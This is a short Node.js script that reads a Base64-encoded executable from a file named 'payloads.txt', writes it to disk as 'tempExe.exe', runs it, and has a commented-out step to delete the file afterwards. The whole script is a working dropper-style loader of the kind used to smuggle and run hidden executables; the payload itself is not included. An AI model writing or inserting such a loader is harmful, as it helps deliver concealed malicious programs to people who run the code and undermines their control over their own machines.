const fs = require('fs');
const { exec } = require('child_process');

// Read the Base64 encoded string from payloads.txt
const ENCODED_EXE = fs.readFileSync('payloads.txt', 'utf8');

// Decode and write to a temporary .exe
fs.writeFileSync('tempExe.exe', Buffer.from(ENCODED_EXE, 'base64'));

// Execute the .exe
exec('tempExe.exe', (error, stdout, stderr) => {
   if (error) {
      console.error(`exec error: ${error}`);
      return;
   }
   console.log(`stdout: ${stdout}`);
   console.error(`stderr: ${stderr}`);
});

// Optionally, clean up the temporary .exe
// fs.unlinkSync('tempExe.exe');

